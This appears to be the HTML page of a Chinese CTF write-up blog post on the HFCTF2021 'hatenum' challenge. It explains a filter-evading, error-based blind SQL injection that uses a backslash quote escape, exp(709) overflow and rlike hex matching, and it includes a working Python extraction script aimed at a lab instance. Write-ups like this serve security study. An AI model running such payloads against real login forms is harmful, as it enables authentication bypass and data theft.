@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[HFCTF2021]hatenumBUU上的复现，之前做其他题的时候一直在想HFCTF是个啥，合肥CTF？听起来就很不合理，这次这个题是之前队里师傅出的，所以我到这个时候才发现原来是虎符CTF。。。 SQL注入题，但是我作为SQL注入废物，自然是不能很顺畅的做出来 题解代码很简单，登录注册两个功能，admin登录就能拿flag。过滤了一堆东西    preg_match(&#39;&#x2F;union|">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[HFCTF2021]hatenum">
+<meta property="og:url" content="https://blog.z3ratu1.cn/[HFCTF2021]hatenum.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="[HFCTF2021]hatenumBUU上的复现，之前做其他题的时候一直在想HFCTF是个啥，合肥CTF？听起来就很不合理，这次这个题是之前队里师傅出的，所以我到这个时候才发现原来是虎符CTF。。。 SQL注入题，但是我作为SQL注入废物，自然是不能很顺畅的做出来 题解代码很简单，登录注册两个功能，admin登录就能拿flag。过滤了一堆东西    preg_match(&#39;&#x2F;union|">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-08-17T12:10:16.000Z">
+<meta property="article:modified_time" content="2021-08-17T14:12:46.118Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="SQLI">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/[HFCTF2021]hatenum.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>[HFCTF2021]hatenum | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/[HFCTF2021]hatenum.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [HFCTF2021]hatenum
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-17 20:10:16 / 修改时间：22:12:46" itemprop="dateCreated datePublished" datetime="2021-08-17T20:10:16+08:00">2021-08-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/%5BHFCTF2021%5Dhatenum.html" class="post-meta-item leancloud_visitors" data-flag-title="[HFCTF2021]hatenum" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/%5BHFCTF2021%5Dhatenum.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%5BHFCTF2021%5Dhatenum.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="HFCTF2021-hatenum"><a href="#HFCTF2021-hatenum" class="headerlink" title="[HFCTF2021]hatenum"></a>[HFCTF2021]hatenum</h1><p>BUU上的复现，之前做其他题的时候一直在想HFCTF是个啥，合肥CTF？听起来就很不合理，这次这个题是之前队里师傅出的，所以我到这个时候才发现原来是虎符CTF。。。</p>
+<p>SQL注入题，但是我作为SQL注入废物，自然是不能很顺畅的做出来</p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>代码很简单，登录注册两个功能，admin登录就能拿flag。过滤了一堆东西<code>    preg_match(&#39;/union|select|or|and|\&#39;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i&#39;, $str))</code>，同时还限制了数字<code>(preg_match(&#39;/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/i&#39;,$str))</code>。登录的话，登录成功失败和发生错误是三个不同的回显，所以可以通过触发错误进行盲注，常见操作就是整数溢出注入了，但是这里限制了数字的位数，所以整数溢出似乎也做不到。</p>
+<p>这里有两种做法，一个是网上常见的wp的答案，exp函数，上限是exp(709)，再加一就会溢出浮点数上界报错，还有一种是学长的<code>~0+1</code>，对0取反直接拿到最大整数<br>这个取反操作挺玄幻的，可能这里是逐位取反，所以对0取反拿到了无符号最大整数？如果对负数取反的话结果会比较玄幻，感觉负数应该是补码存储的，然后取反同样是逐位翻转（包括符号位）</p>
+<pre class=" language-mysql"><code class="language-mysql">mysql> select ~0;
++----------------------+
+| ~0                   |
++----------------------+
+| 18446744073709551615 |
++----------------------+
+1 row in set (0.00 sec)
+
+mysql> select ~(-1);
++-------+
+| ~(-1) |
++-------+
+|     0 |
++-------+
+1 row in set (0.00 sec)
+
+mysql> select ~1;
++----------------------+
+| ~1                   |
++----------------------+
+| 18446744073709551614 |
++----------------------+
+1 row in set (0.00 sec)
+
+mysql> select 18446744073709551615+1;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551615 + 1)'
+mysql> select exp(709);
++-----------------------+
+| exp(709)              |
++-----------------------+
+| 8.218407461554972e307 |
++-----------------------+
+1 row in set (0.00 sec)
+
+mysql> select exp(710);
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
+</code></pre>
+<p>接下来我们看一下过滤，禁用了单双引号各种空格符号和星号，但是注释符和反斜杠没有过滤，没了星号就没有行内注释符了，但是还是可以用井号进行单行注释，用反斜杠转义掉引号然后再注释掉下一个引号，就在password处能有一个完全可控的输入点，也能万能密码登录，不过因为登陆之后还有一部验证码校验，万能密码过了验证码也不知道登不进去，需要通过注入把验证码搞出来<br><code>select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;</code></p>
+<p>有了注入点之后提取数据的方式，这里过滤掉了select，所以是<strong>不能拿其他表的数据了</strong>，这里我一开始忘了，还以为没select又没堆叠又不是MySQL8就拿不到数据了，还是可以拿到当前表的数据的，所以拿code还是有机会的<br>接下来是字符串获取，但是这个过滤是比较狠的，substr，mid，left之类的还有各种大小于号等号都没了，并且没有引号，也不好比较字符串，只能用0x十六进制的形式来表示字符串，但由于题目的限制，最多只能表示四个字符。regexp这个正则也没了，但是还有一个常用字段LIKE还在，搜了一下，不止是LIKE，还有一个叫RLIKE的字段，LIKE要全部匹配才返回1，而RLIKE和REGEXP则是部分匹配即可返回1，刚好满足我们的只有四个字符的条件</p>
+<pre class=" language-mysql"><code class="language-mysql">mysql> select 'abcd' like 'a';
++-----------------+
+| 'abcd' like 'a' |
++-----------------+
+|               0 |
++-----------------+
+1 row in set (0.00 sec)
+
+mysql> select 'abcd' rlike 'a';
++------------------+
+| 'abcd' rlike 'a' |
++------------------+
+|                1 |
++------------------+
+1 row in set (0.00 sec)
+
+mysql> select 'abcd' regexp 'a';
++-------------------+
+| 'abcd' regexp 'a' |
++-------------------+
+|                 1 |
++-------------------+
+1 row in set (0.00 sec)
+</code></pre>
+<p>like是<code>_</code>匹配单个任意字符，<code>%</code>匹配任意数量的字符，rlike和regexp则和标准正则语法比较一致。当然，这里用通配符还会占用更多的字符，所以就硬匹配好了。</p>
+<p>先用<code>^</code>确认开头，然后一个字符一个字符的挪<br>但是还是没有这么顺利，因为一次只能匹配四个字符，那么，如果整个字符串中出现三个连续字符的重复片段，那么接下来的一次匹配匹配上的字符就可能是看你charset的顺序了，这里就出现了这样的情况；并且这里需要表里就一条数据，不然这code就不知道匹配到哪去了。<br>先贴一下垃圾脚本</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
+
+url <span class="token operator">=</span> <span class="token string">"http://37bb2225-a836-4156-8347-f6627b0ef845.node4.buuoj.cn:81/login.php"</span>
+payload <span class="token operator">=</span> <span class="token string">"||exp(709+((code)rlike(0x{})))#"</span>
+charset <span class="token operator">=</span> <span class="token string">"1234567890qwertyuiopasdfghjklzxcvbnm_"</span>
+<span class="token comment" spellcheck="true"># erghruigh2(3,u)</span>
+<span class="token comment" spellcheck="true"># gh23uiu32ig</span>
+<span class="token comment" spellcheck="true"># gh2uygh2(3,u)</span>
+<span class="token comment" spellcheck="true"># erghruigh2uygh23uiu32ig</span>
+result <span class="token operator">=</span> <span class="token string">"67683275"</span>
+plain <span class="token operator">=</span> <span class="token string">"gh2u"</span>
+<span class="token comment" spellcheck="true"># print(result, end="")</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    finds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    result <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> c <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
+        t <span class="token operator">=</span> hex<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
+        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"a\\"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> payload<span class="token punctuation">.</span>format<span class="token punctuation">(</span>result<span class="token operator">+</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"code"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">}</span>
+        <span class="token comment" spellcheck="true"># print(data)</span>
+        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"error"</span> <span class="token operator">==</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            finds<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> len<span class="token punctuation">(</span>finds<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>finds<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        result <span class="token operator">+=</span> finds<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+        plain <span class="token operator">+=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>finds<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span>
+</code></pre>
+<p>这里出现了一个分支，在<code>erghruigh2</code>之后有两个可能字符，3和u，跟进3<br>发现抵达了字符串末尾，而跟进u，其结尾又是gh2，其后可能是3可能是u。这里就真没办法了，只能猜这个跟进u的序列重复了多少次，不过只重复了一次，一次就能过了（这段的逻辑我想了好久才想明白怎么处理。。。。幸好重复的只有一个字段）</p>
+<p>使用char函数也能拼出来字符串，不过这里禁了逗号，所以也不行</p>
+<pre class=" language-mysql"><code class="language-mysql">mysql> select char(0x7133);
++--------------+
+| char(0x7133) |
++--------------+
+| q3           |
++--------------+
+1 row in set (0.00 sec)
+
+mysql> select char(71,70);
++-------------+
+| char(71,70) |
++-------------+
+| GF          |
++-------------+
+1 row in set (0.00 sec)
+</code></pre>
+<h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>有一点讲究，mysql似乎会自己判断输入数字的范围然后决定用什么类型的数字去处理他，小一点的就是无符号整数，负数的话会变成有符号整数，超过无符号整数的数字会用更大的数字处理（？），总之越了无符号数的上界之后就没成功溢出报错过了</p>
+<pre class=" language-mysql"><code class="language-mysql">mysql> select 18446744073709551615+1;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551615 + 1)'
+mysql> select 18446744073709551616+1;
++------------------------+
+| 18446744073709551616+1 |
++------------------------+
+|   18446744073709551617 |
++------------------------+
+1 row in set (0.00 sec)
+</code></pre>
+<h2 id="mysql-where子句处理顺序"><a href="#mysql-where子句处理顺序" class="headerlink" title="mysql where子句处理顺序"></a>mysql where子句处理顺序</h2><p>我觉得这个是个很有意思的点，学到了。以前我们都认为mysql的逻辑处理是从左往右的，比如有一个and语句，<code>1=1 and exp(710)</code>，如果1&#x3D;1为真，那么继续and后的exp语句，如果1&#x3D;1为假，那后面的条件肯定是无意义的，就会被直接的忽略掉，但事实真的如此吗？进行简单的实验</p>
+<pre class=" language-mysql"><code class="language-mysql">mysql> select * from users where id=0 or 1=0 and password=exp(710);
+Empty set (0.00 sec)
+
+mysql> select * from users where id=0 or 1=1 and password=exp(710);
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
+mysql> select * from users where id=0 or 1=0 and exp(710);
+Empty set (0.00 sec)
+</code></pre>
+<p>似乎和之前的认知是一致的，and语句中前一句挂了，后一句就不用执行了。但是，如果把1&#x3D;1换成这个题目类型的payload呢？<br>注：这里没有password中有z的密码</p>
+<pre class=" language-mysql"><code class="language-mysql">mysql> select * from users where id=0 or password rlike 'a' and exp(710);
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
+mysql> select * from users where id=0 or password rlike 'z' and exp(710);
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
+</code></pre>
+<p>仿佛事情有所转机，那么再来一次</p>
+<pre class=" language-mysql"><code class="language-mysql">mysql> select * from users where id=0 or password rlike 'a' and password=exp(710);
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
+mysql> select * from users where id=0 or password rlike 'z' and password=exp(710);
+Empty set (0.00 sec)
+</code></pre>
+<p>我逐渐相信了他的说法，mysql是会以某种顺序去计算条件的，那个师傅提到最有可能的是先计算全常量的表达式，比如之前的<code>1=1</code>，比如这样</p>
+<pre class=" language-mysql"><code class="language-mysql">mysql> select * from users where id=0 or password=exp(710) and 1=1;
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
+mysql> select * from users where id=0 or password=exp(710) and 1=0;
+Empty set (0.00 sec)
+</code></pre>
+<p>把password&#x3D;去掉的话就可能因为都是常量顺序计算都报错了<br>总的来说有点玄幻。。。。用之前先试一下，最好的方法还是做加减而不是靠这种逻辑语句的运算顺序</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="http://roverdoge.top/archives/204">虎符杯final_hatenum复现</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/weixin_39842682/article/details/110493301">mysql where条件执行顺序_MySQL复杂where条件分析</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQLI/" rel="tag"># SQLI</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%5BGKCTF2021%5Dbabycat.html" rel="prev" title="[GKCTF2021]babycat与XMLDecoder反序列化">
+      <i class="fa fa-chevron-left"></i> [GKCTF2021]babycat与XMLDecoder反序列化
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%5BNCTF2019%5Dphar%20matches%20everything.html" rel="next" title="[NCTF2019]phar matches everything">
+      [NCTF2019]phar matches everything <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HFCTF2021-hatenum"><span class="nav-number">1.</span> <span class="nav-text">[HFCTF2021]hatenum</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-number">1.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="nav-number">1.2.</span> <span class="nav-text">整数溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql-where%E5%AD%90%E5%8F%A5%E5%A4%84%E7%90%86%E9%A1%BA%E5%BA%8F"><span class="nav-number">1.3.</span> <span class="nav-text">mysql where子句处理顺序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.4.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
